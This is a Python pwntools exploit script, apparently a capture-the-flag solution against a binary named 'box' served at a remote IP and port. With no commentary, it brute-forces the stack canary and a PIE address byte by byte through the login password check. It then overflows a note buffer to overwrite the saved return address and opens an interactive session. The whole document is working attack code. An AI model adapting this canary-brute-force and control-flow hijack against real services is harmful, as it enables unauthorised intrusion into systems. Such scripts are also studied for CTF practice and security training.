#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

host = '60.251.236.18'
y = remote( host , 10006 )
y = process( '../box/share/box' )

def login( usr , pwd ):
    y.sendafter( '>' , '2' )
    y.sendafter( ':' , usr )
    y.sendafter( ':' , pwd )

def logout():
    y.sendafter( '>' , '5' )

def new( data ):
    y.sendafter( '>' , '1' )
    y.sendlineafter( '> ' , data )

def update( idx , data ):
    y.sendafter( '>' , '2' )
    y.sendafter( '?' , str( idx ) )
    y.sendafter( '> ' , data )

def dle( idx ):
    y.sendafter( '>' , '4' )
    y.sendafter( '?' , str( idx ) )

y.sendafter( '>' , '1' )
y.sendafter( ':' , 'a' )
y.sendafter( ':' , 'b' )

pwd = 'b'.ljust( 0x88 , '\0' )

canary = '\0'

for i in range( 0x7 ):
    for c in range( 0x100 ):
        login( 'a' , pwd + canary + chr( c ) )
        if 'successfully.' in y.recvline():
            logout()
            canary += chr( c )
            info( 'canary -> %s' % hex( u64( canary.ljust( 8 , '\0' ) ) ) )
            break
        
success( 'canary -> %s' % hex( u64( canary ) ) )

leak = ''

for i in range( 0x6 ):
    for c in range( 0x100 ):
        login( 'a' , pwd + canary + leak + chr( c ) )
        if 'successfully.' in y.recvline():
            logout()
            leak += chr( c )
            info( 'leak -> %s' % hex( u64( leak.ljust( 8 , '\0' ) ) ) )
            break

pie = u64( leak + '\0\0' ) - 0x1950
success( 'pie -> %s' % hex( pie ) )

login( 'a' , 'b' )

for _ in range( 8 ):
    new( 'a' )

dle( 6 )
new( 'a' * 232 )

main = pie + 0x13e8

p = flat(
    canary,
    0,
    main
)

update( 7 , 'a' * 0xe8 + p[:-1] )


y.interactive()